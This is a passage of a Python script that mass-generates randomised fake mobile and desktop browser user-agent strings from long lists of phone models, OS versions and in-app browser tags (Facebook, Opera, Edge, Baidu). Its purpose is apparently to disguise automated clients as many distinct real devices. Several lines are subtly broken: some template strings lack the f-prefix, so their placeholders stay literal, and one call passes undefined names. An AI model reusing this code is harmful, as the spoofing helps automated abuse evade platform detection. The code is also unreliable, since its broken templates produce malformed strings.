    A7A2  = f"Mozilla/5.0 (Android; Android {str(rr(7,12))}; LG-H920 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/534.0"
    A7A3  = f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; Elephone P3000 Build/KTU84P) AppleWebKit/600.33 (KHTML, like Gecko)  Chrome/{str(rr(33,199))}.0.{str(rr(1500,2900))}.{str(rr(75,450))} Mobile Safari/536.1"
    A7A4  = "Mozilla/5.0 (Android; Android {str(rr(7,12))}; HUAWEI G{str(rr(2,12))}-L{str(rr(3,12))} Build/HuaweiG{str(rr(7,12))}-L{str(rr(7,12))}) AppleWebKit/534.40 (KHTML, like Gecko)  Chrome/{str(rr(25,150))}.0.{str(rr(2111,4999))}.{str(rr(73,299))} Mobile Safari/533.9"
    A7A5  = "Mozilla/5.0 (Linux; U; Android {str(rr(3,12))}; Samsung Galaxy S4 Mega GT-{str(rr(I4400,I9400))} Build/JDQ{str(rr(21,112))}) AppleWebKit/537.24 (KHTML, like Gecko)  Chrome/{str(rr(25,150))}.0.{str(rr(1111,3999))}.{str(rr(73,199))} Mobile Safari/534.0"
    A7A6  = "Mozilla/5.0 (iPad; CPU iPad OS {str(rr(7,12))}_{str(rr(3,8))}_0 like Mac OS X) AppleWebKit/537.46 (KHTML, like Gecko)  Chrome/{str(rr(25,150))}.0.{str(rr(1111,3999))}.{str(rr(73,399))} Mobile Safari/536.3"
    A7A7  = f"Mozilla/5.0 (Android; Android{str(rr(4,12))}; MOTOROLA MOTO XT{str(rr(1300,1580))} Build/LXB{str(rr(10,25))}) AppleWebKit/602.48 (KHTML, like Gecko)  Chrome/{str(rr(25,150))}.0.{str(rr(1111,3999))}.{str(rr(73,599))} Mobile Safari/537.36"
    A7A8  = "Mozilla/5.0 (iPad; CPU iPad OS {str(rr(7,16))}_{str(rr(4,22))}_{str(rr(4,12))} like Mac OS X) AppleWebKit/600.2 (KHTML, like Gecko)  Chrome/{str(rr(25,150))}.0.{str(rr(1111,3999))}.{str(rr(73,599))} Mobile Safari/534.6"
    ugen.append(A7A)
    ugen.append(A7A1)
    ugen.append(A7A2)
    ugen.append(A7A3)
    ugen.append(A7A4)
    ugen.append(A7A5)
    ugen.append(A7A6)
    ugen.append(A7A7)
    ugen.append(A7A8)

for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)

for xd in range(10000):
    rr = random.randint; rc = random.choice
    gt = ['N4LEFH','TQ2A','QQ1B','PQ1A','SQ3A','RD1B','LDK2WU','SD2A','AB03E','Z367Q','R8638','C886H'] 
    strvgt = f"viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .{str(rr(1,20))}; WOW64){str(rc(gt))})Applewebkit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Safari/537.36 Vivaldi/6.0.2979.18"
    uateddy = random.choice([strvgt])
    ugen.append(uateddy)


def Ugen():
	a = random.choice(["7","8","9","10","12","13","14","6.0","7.0","8.0","9.0","7.1.1","8.0.0","8.1.0",f"{str(random.randint(5,9))}.0.0",f"{str(random.randint(5,9))}.0.1",f"{str(random.randint(5,9))}.1.1",f"{str(random.randint(5,9))}.1.{str(random.randint(0,1))}",f"{str(random.randint(5,9))}.0",str(random.randint(5,14))])
	b = random.choice(["LRX22C","LRX21V","LRX22G","LMY47I","LMY47V","OPM1","OPR1","O11019","TPR1","TP1A","RP1A","PPR1","PKQ1","QQ1A","QP1A","SKQ1","SP1A","RKQ1","RQ1A","QKQ1","TKQ1"])
	c = random.randrange(130000,230000)
	d = random.randrange(10,32)
	e = random.randrange(80,120)
	f = '0'
	g = random.randrange(4200,6200)
	h = random.randrange(70,200)
	i = random.choice(['MZ-m1 note','MZ-m2 note','MZ-M3s','MZ-M3','MZ-M5s','MZ-M3 Max','MZ-m3 note','MZ-MX4','MZ-U20','MZ-MX4 Pro','MZ-PRO 5','MZ-U10','MZ-M5c','MZ-meizu M8 lite','MZ-mmm52','MZ-Meizu S6','MZ-M3 Max','MZ-M1 E','MZ-meizu note9','MZ-16 X','MZ-16th Plus','MZ-15 Plus','MZ-16T','MZ-M6','MZ-PRO 7 Plus','MZ-m1 metal','MZ-16s Pro','MZ-M5 Note','MZ-Meizu 6T','MZ-16 X','MZ-16th','MZ-MEIZU 18X','MZ-MEIZU 18s','MZ-M1822','MZ-meizu 17','MZ-meizu 17 Pro','MZ-MEIZU 18 Pro','MZ-TYH212U','MZ-MEIZU 20','MZ-MEIZU 20 Pro','Meizu C3','MZ-ZTE T660','ZTE BLADE 8'])
	j = random.choice(['RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020','RMX3516','RMX3371','RMX3461','RMX3286','RMX3561','RMX3388','RMX3311','RMX3142','RMX2071','RMX1805','RMX1809','RMX1801','RMX1807','RMX1803','RMX1825','RMX1821','RMX1822','RMX1833','RMX1851','RMX1853','RMX1827','RMX1911','RMX1919','RMX1927','RMX1971','RMX1973','RMX2030','RMX2032','RMX1925','RMX1929','RMX2001','RMX2061','RMX2063','RMX2040','RMX2042','RMX2002','RMX2151','RMX2163','RMX2155','RMX2170','RMX2103','RMX3085','RMX3241','RMX3081','RMX3151','RMX3381','RMX3521','RMX3474','RMX3471','RMX3472','RMX3392','RMX3393','RMX3491','RMX1811','RMX2185','RMX3231','RMX2189','RMX2180','RMX2195','RMX2101','RMX1941','RMX1945','RMX3063','RMX3061','RMX3201','RMX3203','RMX3261','RMX3263','RMX3193','RMX3191','RMX3195','RMX3197','RMX3265','RMX3268','RMX3269','RMX2027','RMX2020','RMX2021','RMX3581','RMX3501','RMX3503','RMX3511','RMX3310','RMX3312','RMX3551','RMX3301','RMX3300','RMX2202','RMX3363','RMX3360','RMX3366','RMX3361','RMX3031','RMX3370','RMX3357','RMX3560','RMX3562','RMX3350','RMX2193','RMX2161','RMX2050','RMX2156','RMX3242','RMX3171','RMX3430','RMX3235','RMX3506','RMX2117','RMX2173','RMX3161','RMX2205','RMX3462','RMX3478','RMX3372','RMX3574','RMX1831','RMX3121','RMX3122','RMX3125','RMX3043','RMX3042','RMX3041','RMX3092','RMX3093','RMX3571','RMX3475','RMX2200','RMX2201','RMX2111','RMX2112','RMX1901','RMX1903','RMX1992','RMX1993','RMX1991','RMX1931','RMX2142','RMX2081','RMX2085','RMX2083','RMX2086','RMX2144','RMX2051','RMX2025','RMX2075','RMX2076','RMX2072','RMX2052','RMX2176','RMX2121','RMX3115','RMX1921'])
	k = random.choice(['CPH1869','CPH1929','CPH2107','CPH2238','CPH2389','CPH2401','CPH2407','CPH2413','CPH2415','CPH2417','CPH2419','CPH2455','CPH2459','CPH2461','CPH2471','CPH2473','CPH2477','CPH8893','CPH2321','CPH2341','CPH2373','CPH2083','CPH2071','CPH2077','CPH2185','CPH2179','CPH2269','CPH2421','CPH2349','CPH2271','CPH1923','CPH1925','CPH1837','CPH2015','CPH2073','CPH2081','CPH2029','CPH2031','CPH2137','CPH1605','CPH1803','CPH1853','CPH1805','CPH1809','CPH1851','CPH1931','CPH1959','CPH1933','CPH1935','CPH1943','CPH2061','CPH2069','CPH2127','CPH2131','CPH2139','CPH2135','CPH2239','CPH2195','CPH2273','CPH2325','CPH2309','CPH1701','CPH2387','CPH1909','CPH1920','CPH1912','CPH1901','CPH1903','CPH1905','CPH1717','CPH1801','CPH2067','CPH2099','CPH2161','CPH2219','CPH2197','CPH2263','CPH2375','CPH2339','CPH1715','CPH2385','CPH1729','CPH1827','CPH1938','CPH1937','CPH1939','CPH1941','CPH2001','CPH2021','CPH2059','CPH2121','CPH2123','CPH2203','CPH2333','CPH2365','CPH1913','CPH1911','CPH1915','CPH1969','CPH2209','CPH1987','CPH2095','CPH2119','CPH2285','CPH2213','CPH2223','CPH2363','CPH1609','CPH1613','CPH1723','CPH1727','CPH1725','CPH1819','CPH1821','CPH1825','CPH1881','CPH1823','CPH1871','CPH1875','CPH2023','CPH2005','CPH2025','CPH2207','CPH2173','CPH2307','CPH2305','CPH2337','CPH1955','CPH1707','CPH1719','CPH1721','CPH1835','CPH1831','CPH1833','CPH1879','CPH1893','CPH1877','CPH1607','CPH1611','CPH1917','CPH1919','CPH1907','CPH1989','CPH1945','CPH1951','CPH2043','CPH2035','CPH2037','CPH2036','CPH2009','CPH2013','CPH2113','CPH2091','CPH2125','CPH2109','CPH2089','CPH2065','CPH2159','CPH2145','CPH2205','CPH2201','CPH2199','CPH2217','CPH1921','CPH2211','CPH2235','CPH2251','CPH2249','CPH2247','CPH2237','CPH2371','CPH2293','CPH2353','CPH2343','CPH2359','CPH2357','CPH2457','CPH1983','CPH1979','oppo f 5 plus','OPPO F1','OPPO F1 Plus','PEPM00','PEDM00','PCHM10','PCLM10','PCCM00','PDBM00','OPPO PBBM30','OPPO A31','OPPO F1s','A31','OPPO R11s','OPPO A37m'])
	l = random.choice(['Infinix Hot 10','Infinix X688B','Infinix X682B','Infinix X658E','Infinix PR652B','Infinix X659B','Infinix X689','Infinix X689D','Infinix X662','Infinix X676B','Infinix X687','Infinix X609','Infinix X697','Infinix X680D','Infinix X507','Infinix X605','Infinix X668','Infinix X6815B','Infinix X624','Infinix X655F','Infinix X689C','Infinix X608','Infinix X698','Infinix X682C','Infinix X688C','Infinix X689B','Infinix X689','Infinix X689D','Infinix X662','Infinix X662B','Infinix X675','Infinix X6812B','Infinix X6812','Infinix X6817B','Infinix X6817','Infinix X6816C','Infinix X6816','Infinix X6816D','Infinix X668C','Infinix X665B','Infinix X665E','Infinix X510','Infinix X559C','Infinix X559F','Infinix X559','Infinix X606','Infinix X606C','Infinix X606D','Infinix X623','Infinix X624B','Infinix X625C','Infinix X625D','Infinix X625B','Infinix X650D','Infinix X650B','Infinix X650','Infinix X650C','Infinix X655C','Infinix X655D','Infinix X680B','Infinix X573','Infinix X573B','Infinix X622','Infinix X693','Infinix X695C','Infinix X695D','Infinix X695','Infinix X663B','Infinix X663','Infinix X670','Infinix X671','Infinix X671B','Infinix X672','Infinix X6819','Infinix X572','Infinix X572-LTE','Infinix X571','Infinix X604','Infinix X610B','Infinix X690','Infinix X690B','Infinix X656','Infinix X692','Infinix X683','Infinix X450','Infinix X5010','Infinix X501','Infinix X401','Infinix X626','Infinix X626B','Infinix X652','Infinix X652A','Infinix X652B','Infinix X652C','Infinix X660B','Infinix X660C','Infinix X660','Infinix X5515','Infinix X5515F','Infinix X5515I','Infinix X609B','Infinix X5514D','Infinix X5516B','Infinix X5516C','Infinix X627','Infinix X680','Infinix X653','Infinix X653C','Infinix X657','Infinix X657B','Infinix X657C','Infinix X6511B','Infinix X6511E','Infinix X6511','Infinix X6512','Infinix X6823C','Infinix X612B','Infinix X612','Infinix X503','Infinix X511','Infinix X352','Infinix X351','Infinix X530','Infinix X676C','Infinix X6821','Infinix X6823','Infinix X6827','Infinix X509','Infinix X603','Infinix X6815','Infinix X620B','Infinix X620','Infinix X687B','Infinix X6811B','Infinix X6810','Infinix X6811',f"Infinix X{str(random.randint(550,699))}{random.choice(['B','C','D','E','F',''])}",f"Infinix X{str(random.randint(5511,5516))}{random.choice(['B','C','D','E','F',''])}",f"Infinix X{str(random.randint(6711,6899))}{random.choice(['B','C','D','E','F',''])}"])
	m = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','G-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750','GT-I9300','TECNO CD8','itel L6005','itel L6501','TECNO KE7','TECNO IN2','TECNO CD6j','TECNO BD2p','TECNO KD7h','TECNO LA7','itel W6004','MobiGo2','TECNO LC6','TECNO KB7j','itel S661W','TB300FU','S96GT','ZTE A2023G','OPPO A79kt','TECNO CI7n','MP1718','V2154A','SAMSUNG SM-M346B','itel S663L','CHL-AL00','vivo Z3x','CHL-AL00','ivvi P60(i8)'])
	n = random.choice([f'{str(random.randint(10,18))}_{str(random.randint(0,9))}_{str(random.randint(0,9))}',f'{str(random.randint(10,18))}_{str(random.randint(0,9))}'])
	o = random.choice(["en-us","en-HK","id-id","de-de","ru-ru","en-sg","my-sg","fr-fr","fa-ir","ja-jp","pt-br","cs-cz","zh-hk","zh-cn","vi-vn","en-ph","en-in","tr-tr","es-es","it-it","zh-tw"])
	z = random.choice([
		f"Mozilla/5.0 (Linux; U; Android {a}; {o}; {i} Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h}{random.choice([f' MZBrowser/{str(random.randint(6,8))}.{str(random.randint(0,20))}.110-{str(random.randint(2000000000,2029999999))} UWS/2.15.0.4',f' MZBrowser/{str(random.randint(6,8))}.{str(random.randint(0,10))}.{str(random.randint(0,10))} UWS/2.15.0.2',f' MZBrowser/{str(random.randint(8,10))}.{str(random.randint(0,20))}.{str(random.randint(0,20))}',f' MQQBrowser/{str(random.randint(4,10))}.{str(random.randint(0,9))}',f' UCBrowser/{str(random.randint(1,9))}.{str(random.randint(1,9))}.{str(random.randint(1,9))}.{str(random.randint(100,1299))}'])} Mobile Safari/537.36",
		f"Mozilla/5.0 (Linux; Android {a}; {j} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h} Mobile Safari/537.36{random.choice(['',f' T7/12.10 SP-engine/2.28.0 baiduboxapp/12.10.0.10 (Baidu; P1 10) NABar/1.0',f' OPR/{str(random.randint(20,50))}.{str(random.randint(0,1))}.{str(random.randint(1000,4999))}.{str(random.randint(70000,209999))}',f' OPR/{str(random.randint(50,80))}.{str(random.randint(0,1))}.{str(random.randint(1000,6999))}.{str(random.randint(10000,69999))}',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm64',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm',f' [FB_IAB/FB4A;FBAV/{str(random.randint(400,449))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f'[FBAN/EMA;FBLC/id_ID;FBAV/{str(random.randint(300,389))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' [FB_IAB/Orca-Android;FBAV/{str(random.randint(400,439))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' EdgA/{str(random.randint(30,129))}.0.{str(random.randint(1100,1299))}.{str(random.randint(10,99))}',f' Edg/{str(random.randint(73,129))}.0.{str(random.randint(1200,2999))}.{str(random.randint(73,250))}',f' baiduboxapp/4.8 (Baidu; P1 4.1.2)',f' GNews Android/2022166490',''])}",
		f"Mozilla/5.0 (Linux; Android {a}; {k} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h} Mobile Safari/537.36{random.choice(['',f' T7/12.10 SP-engine/2.28.0 baiduboxapp/12.10.0.10 (Baidu; P1 10) NABar/1.0',f' OPR/{str(random.randint(20,50))}.{str(random.randint(0,1))}.{str(random.randint(1000,4999))}.{str(random.randint(70000,209999))}',f' OPR/{str(random.randint(50,80))}.{str(random.randint(0,1))}.{str(random.randint(1000,6999))}.{str(random.randint(10000,69999))}',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm64',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm',f' [FB_IAB/FB4A;FBAV/{str(random.randint(400,449))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f'[FBAN/EMA;FBLC/id_ID;FBAV/{str(random.randint(300,389))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' [FB_IAB/Orca-Android;FBAV/{str(random.randint(400,439))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' EdgA/{str(random.randint(30,129))}.0.{str(random.randint(1100,1299))}.{str(random.randint(10,99))}',f' Edg/{str(random.randint(73,129))}.0.{str(random.randint(1200,2999))}.{str(random.randint(73,250))}',f' baiduboxapp/4.8 (Baidu; P1 4.1.2)',f' GNews Android/2022166490',''])}",
		f"Mozilla/5.0 (Linux; Android {a}; {l} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h} Mobile Safari/537.36{random.choice(['',f' T7/12.10 SP-engine/2.28.0 baiduboxapp/12.10.0.10 (Baidu; P1 10) NABar/1.0',f' OPR/{str(random.randint(20,50))}.{str(random.randint(0,1))}.{str(random.randint(1000,4999))}.{str(random.randint(70000,209999))}',f' OPR/{str(random.randint(50,80))}.{str(random.randint(0,1))}.{str(random.randint(1000,6999))}.{str(random.randint(10000,69999))}',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm64',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm',f' [FB_IAB/FB4A;FBAV/{str(random.randint(400,449))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f'[FBAN/EMA;FBLC/id_ID;FBAV/{str(random.randint(300,389))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' [FB_IAB/Orca-Android;FBAV/{str(random.randint(400,439))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' EdgA/{str(random.randint(30,129))}.0.{str(random.randint(1100,1299))}.{str(random.randint(10,99))}',f' Edg/{str(random.randint(73,129))}.0.{str(random.randint(1200,2999))}.{str(random.randint(73,250))}',f' baiduboxapp/4.8 (Baidu; P1 4.1.2)',f' GNews Android/2022166490',''])}",
		f"Mozilla/5.0 (Linux; Android {a}; {m} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h} Mobile Safari/537.36{random.choice(['',f' T7/12.10 SP-engine/2.28.0 baiduboxapp/12.10.0.10 (Baidu; P1 10) NABar/1.0',f' OPR/{str(random.randint(20,50))}.{str(random.randint(0,1))}.{str(random.randint(1000,4999))}.{str(random.randint(70000,209999))}',f' OPR/{str(random.randint(50,80))}.{str(random.randint(0,1))}.{str(random.randint(1000,6999))}.{str(random.randint(10000,69999))}',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm64',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm',f' [FB_IAB/FB4A;FBAV/{str(random.randint(400,449))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f'[FBAN/EMA;FBLC/id_ID;FBAV/{str(random.randint(300,389))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' [FB_IAB/Orca-Android;FBAV/{str(random.randint(400,439))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' EdgA/{str(random.randint(30,129))}.0.{str(random.randint(1100,1299))}.{str(random.randint(10,99))}',f' Edg/{str(random.randint(73,129))}.0.{str(random.randint(1200,2999))}.{str(random.randint(73,250))}',f' baiduboxapp/4.8 (Baidu; P1 4.1.2)',f' GNews Android/2022166490',''])}",
		f"Mozilla/5.0 (iPad; CPU OS {n} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/605.1.15{random.choice([f' GNews iOS/5.74.201',f' QBWebViewUA/2 QBWebViewType/1 WKType/1',''])}",
		f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{str(random.randint(0,10))}_{str(random.randint(0,10))}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{str(random.randint(10,20))}.0 Safari/605.1.15{random.choice([f' GNews iOS/5.74.201',f' QBWebViewUA/2 QBWebViewType/1 WKType/1',''])}",
		f"Mozilla/5.0 (iPhone; CPU iPhone OS {n} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/115 Mobile/15E148 Safari/605.1.15",
		f"Mozilla/5.0 (iPhone; CPU iPhone OS {n} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{str(random.randint(10,20))}.0 MQQBrowser/14.7.6 Mobile/15E148 Safari/604.1",
		f"Mozilla/5.0 (iPhone; CPU iPhone OS {n} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/122.0.2365.9 Version/{str(random.randint(10,20))}.0 Mobile/15E148 Safari/604.1",
		f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{str(random.randint(0,10))}_{str(random.randint(0,10))}) AppleWebKit/583.3 (KHTML, like Gecko) Chrome/{e}.{f}.{g}.{h} Safari/583.3 {random.choice([f' Edg/{str(random.randint(73,129))}.0.{str(random.randint(1200,2999))}.{str(random.randint(73,250))}',''])}",
		f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{str(random.randint(0,10))}_{str(random.randint(0,10))}; en-US) AppleWebKit/603.7.5 (KHTML, like Gecko) Version/13.0.3 Safari/603.7.5",
		f"Mozilla/5.0 (Linux; Android {a}; {random.choice([f'{l}','Infinix X608'])} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h} Mobile Safari/537.36{random.choice(['',f' T7/12.10 SP-engine/2.28.0 baiduboxapp/12.10.0.10 (Baidu; P1 10) NABar/1.0',f' OPR/{str(random.randint(20,50))}.{str(random.randint(0,1))}.{str(random.randint(1000,4999))}.{str(random.randint(70000,209999))}',f' OPR/{str(random.randint(50,80))}.{str(random.randint(0,1))}.{str(random.randint(1000,6999))}.{str(random.randint(10000,69999))}',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm64',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm',f' [FB_IAB/FB4A;FBAV/{str(random.randint(400,449))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f'[FBAN/EMA;FBLC/id_ID;FBAV/{str(random.randint(300,389))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' [FB_IAB/Orca-Android;FBAV/{str(random.randint(400,439))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' EdgA/{str(random.randint(30,129))}.0.{str(random.randint(1100,1299))}.{str(random.randint(10,99))}',f' 